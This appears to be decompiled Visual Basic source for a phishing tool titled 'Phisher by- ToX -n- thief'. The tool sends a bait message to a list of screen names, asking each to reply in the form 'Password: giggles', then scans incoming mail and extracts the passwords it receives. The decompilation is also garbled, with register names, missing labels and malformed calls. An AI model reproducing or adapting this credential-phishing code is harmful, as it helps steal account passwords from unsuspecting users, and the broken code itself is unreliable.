VERSION 5.00
Begin VB.Form Form2
  Caption = "<>< Phisher by- ToX  -n-  thief  ><>"
  MousePointer = 99 'Custom
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  Picture = "Form2.frx":0
  BorderStyle = 1 'Fixed Single
  Icon = "Form2.frx":8842
  LinkTopic = "Form2"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 150
  ClientTop = 435
  ClientWidth = 4065
  ClientHeight = 2970
  MouseIcon = "Form2.frx":8B4C
  StartUpPosition = 2 'CenterScreen
  Begin Timer Timer1
    Enabled = 0   'False
    Interval = 1
    Left = 0
    Top = 0
  End
  Begin CommandButton Command7
    Caption = "Create Phrase"
    Left = 2160
    Top = 2640
    Width = 1815
    Height = 255
    TabIndex = 11
  End
  Begin CommandButton Command6
    Caption = "Save Phrase To File"
    Left = 2160
    Top = 2400
    Width = 1815
    Height = 255
    TabIndex = 10
  End
  Begin CommandButton Command5
    Caption = "Load Phrase From File"
    Left = 2160
    Top = 2160
    Width = 1815
    Height = 255
    TabIndex = 9
  End
  Begin TextBox Text2
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 2160
    Top = 120
    Width = 1815
    Height = 1935
    Enabled = 0   'False
    Text = "Form2.frx":8E56
    TabIndex = 6
    MultiLine = -1  'True
    ScrollBars = 2
  End
  Begin CommandButton Command4
    Caption = "Options"
    Left = 120
    Top = 1560
    Width = 1815
    Height = 255
    TabIndex = 5
  End
  Begin TextBox Text1
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 120
    Top = 1200
    Width = 1815
    Height = 285
    Text = "Name"
    TabIndex = 4
  End
  Begin CommandButton Command3
    Caption = "Add Name"
    Left = 120
    Top = 2640
    Width = 1815
    Height = 255
    TabIndex = 3
  End
  Begin CommandButton Command2
    Caption = "Addroom"
    Left = 120
    Top = 2400
    Width = 1815
    Height = 255
    TabIndex = 2
  End
  Begin CommandButton Command1
    Caption = "Start"
    Left = 120
    Top = 2160
    Width = 1815
    Height = 255
    TabIndex = 1
  End
  Begin ListBox List1
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 120
    Top = 120
    Width = 1815
    Height = 1035
    TabIndex = 0
  End
  Begin Line Line1
    BorderColor = &H808080&
    X1 = 2040
    Y1 = 120
    X2 = 2040
    Y2 = 2880
  End
  Begin Label Label2
    Caption = "List Count:"
    ForeColor = &HFF&
    Left = 120
    Top = 1920
    Width = 855
    Height = 255
    TabIndex = 8
    BackStyle = 0 'Transparent
  End
  Begin Label Label1
    Caption = "0"
    ForeColor = &HFF&
    Left = 960
    Top = 1920
    Width = 975
    Height = 255
    TabIndex = 7
    BackStyle = 0 'Transparent
  End
  Begin Menu Options
    Visible = 0   'False
    Caption = "Options"
    Begin Menu Add
      Caption = "Add"
    End
    Begin Menu Addroom
      Caption = "Add Room"
    End
    Begin Menu removename
      Caption = "Remove Name"
    End
    Begin Menu Clearlist
      Caption = "Clear list"
    End
    Begin Menu dd
      Caption = "___________"
      Enabled = 0   'False
    End
    Begin Menu gfdfg
      Caption = "Start It"
    End
  End
End

Attribute VB_Name = "Form2"


Private Sub List1_DblClick()
  var_eax = Call Form2.removename_Click
End Sub

Private Sub Command6_Click()
  var_eax = Form5.Show var_18
End Sub

Private Sub Addroom_Click()
  Dim var_1C As ListBox
  call MailOpenNew(var_1C, var_24, var_1C)
  var_24 = List1.ListCount
  var_18 = var_24
  Exit Sub
End Sub

Private Sub gfdfg_Click()
  Dim var_38 As TextBox
  Dim var_4C As ListBox
  var_28 = Text2.Text
  If (var_28 = vbNullString) + 1 = 0 Then GoTo loc_004775DE
  var_5C = "Phish by- thief"
  var_4C = "You need a Phish message"
  GoTo loc_004778C7
  var_28 = List1.Text
  If (var_28 = vbNullString) + 1 = 0 Then GoTo loc_004775D1
  var_5C = "Phish by- thief"
  var_C0 = List1.ListCount
  var_C0 = var_C0 - 0001h
  var_94 = var_C0
  For var_24 = "" To var_C0 Step 1
  If var_F0 = 0 Then GoTo loc_004775D1
  var_24 = CInt(var_28)
  var_38 = List1.List(var_24)
  var_30 = Text2.Text
  call MailOpenOld(var_28, var_30, var_3C)
  Next var_24
  Exit Sub
  Exit Sub
End Sub

Private Sub removename_Click()
  Dim var_20 As ListBox
  Dim var_B0 As ListBox
  var_A4 = List1.ListCount
  If ebx = 0 Then GoTo loc_00477A84
  var_68 = "No One on List"
  GoTo loc_00477AFD
  var_A4 = List1.SelCount
  If ebx = 0 Then GoTo loc_00477B48
  var_30 = "Highlight Name"
  GoTo loc_00477C75
  var_B0 = var_20
  var_A4 = List1.ListIndex
  var_eax = List1.RemoveItem var_A4
  var_A4 = List1.ListCount
  var_18 = var_A4
  Exit Sub
End Sub

Private Sub Timer1_Timer()
  call FindSendWindow(edi, esi, ebx)
  If call FindSendWindow(edi, esi, ebx) = 0 Then GoTo loc_00478413
  call FindSendWindow(, , )
  var_90 = call MailOpenEmailNew(, , )
  var_28 = LCase(call MailOpenEmailNew(, , ))
  var_18 = call MailOpenEmailFlash(, , )
  call Proc_47AC90(CLng(call FindSendWindow(, , )), , )
  call Proc_47AEC0(0.5, , )
  call MailOpenSent(var_18, , )
  var_C0 = "password:"
  call InStr(var_98, InStr, var_C8, var_28, &h00000001)
  var_E0 = CBool(InStr(var_98, InStr, var_C8, var_28, &h00000001))
  If var_E0 = 0 Then GoTo loc_00478411
  var_A8 = LCase("Password:")
  call InStr(var_B8, &h00000000, var_A8, var_28, &h00000001)
  var_48 = InStr(var_B8, &h00000000, var_A8, var_28, &h00000001)
  var_58 = Mid(var_28, var_48, Len(var_28))
  var_98 = Trim(Right(var_58, CLng(Len(var_58) - 9)))
  var_68 = var_98
  call InStr(var_98, &h00000000, var_C8, var_68, &h00000001)
  var_78 = Left(var_68, CLng(InStr(var_98, &h00000000, var_C8, var_68, &h00000001)))
  var_C0 = var_18
  var_F8 = var_84
  var_7C = CStr(Trim(var_18))
  var_FC = var_84
  var_7C = CStr(Trim(var_78))
  Exit Sub
  Exit Sub
End Sub

Private Sub Form_Load()
  var_18 = Me.Top
  Me.Top = var_18
  var_18 = Me.Top
  Me.Left = var_18
  Me.Enabled = False
End Sub

Private Sub Form_Unload(Cancel As Integer)
  var_1C = Me.Top
  Me.Top = var_1C
  var_1C = Me.Top
  Me.Left = var_1C
  Me.Enabled = True
  Timer1.Enabled = False
  Exit Sub
  Exit Sub
End Sub

Private Sub Command7_Click()
  Dim var_20 As Variant
  Dim var_60 As TextBox
  var_18 = Command7.Caption
  If (var_18 = "Create Phrase") + 1 = 0 Then GoTo loc_00476D99
  Text2.Enabled = True
  Command7.Caption = "Set Phrase"
  If edi >= 0 Then GoTo loc_00476F1A
  GoTo loc_00476F0B
  var_4C = "(Please respond in this formatt: Password: giggles)"
  call InStr(var_44, &h00000000, var_54, var_34, &h00000001, var_20, %ecx = "", Me, var_20, (var_18 = "Create Phrase"), Me, var_20, var_54, Me, %ecx = "", edi)
  If CBool(InStr(var_44, &h00000000, var_54, var_34, &h00000001, var_20, var_44 <> "", Me, var_20, (var_18 <> "Create Phrase") <> 0 Then GoTo loc_00476EA8
  var_60 = var_34
  var_18 = Text2.Text
  Text2.Text = var_18 & "(Please respond in this formatt: Password: giggles)"
  Text2.Enabled = False
  Command7.Caption = "Create Phrase"
  If var_20 >= 0 Then GoTo loc_00476F1A
  Exit Sub
End Sub

Private Sub Add_Click()
  Dim var_28 As ListBox
  var_1C = Text1.Text
  var_18 = var_1C
  var_1C = Text1.Text
  var_20 = Text1.Text
  eax = (var_1C = vbNullString) + 1
  If (var_1C = vbNullString) + 1 = 0 Then GoTo loc_00475CFC
  var_38 = "Add screen name"
  GoTo loc_00475E53
  var_eax = List1.AddItem var_18, var_6C
  var_B8 = var_28
  var_AC = List1.ListCount
  var_1C = var_AC
  Text1.Text = vbNullString
  Exit Sub
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
  If KeyAscii <> 13 Then GoTo loc_00477D48
  var_eax = Call Form2.Add_Click
End Sub

Private Sub Clearlist_Click()
  var_C0 = List1.ListCount
  If eax = 0 Then GoTo loc_00476183
  var_3C = "No One on List"
  GoTo loc_004762C6
  var_24 = MsgBox("Clear List", 36, var_4C, var_5C, var_6C)
  If (var_24 = 6) = 0 Then GoTo loc_004762AA
  var_eax = List1.Clear
  var_28 = 0
  Exit Sub
End Sub

Private Sub Command2_Click()
  Dim var_1C As ListBox
  call MailOpenNew(var_1C, var_24, var_1C)
  var_24 = List1.ListCount
  var_18 = var_24
  Exit Sub
End Sub

Private Sub Command1_Click()
  Dim var_38 As Variant
  var_28 = Text2.Text
  If (var_28 = vbNullString) + 1 = 0 Then GoTo loc_0047649A
  var_4C = "you need a message"
  GoTo loc_00476685
  var_C0 = List1.ListCount
  var_C0 = var_C0 - 0001h
  var_94 = var_C0
  For var_24 = "" To var_C0 Step 1
  If var_E0 = 0 Then GoTo loc_00476649
  var_24 = CInt(var_28)
  var_38 = List1.List(var_24)
  var_30 = Text2.Text
  call MailOpenOld(var_28, var_30, var_3C)
  Next var_24
  GoTo loc_00476553
  Timer1.Enabled = True
  Exit Sub
  Exit Sub
End Sub

Private Sub Command3_Click()
  var_eax = Call Form2.Add_Click
End Sub

Private Sub Command4_Click()
  Exit Sub
End Sub

Private Sub Command5_Click()
  var_eax = Form4.Show var_18
End Sub

Public Sub Proc_1_17_476F90
  var_18 = call FindSendWindow(edi, esi, ebx)
  Exit Sub
End Sub
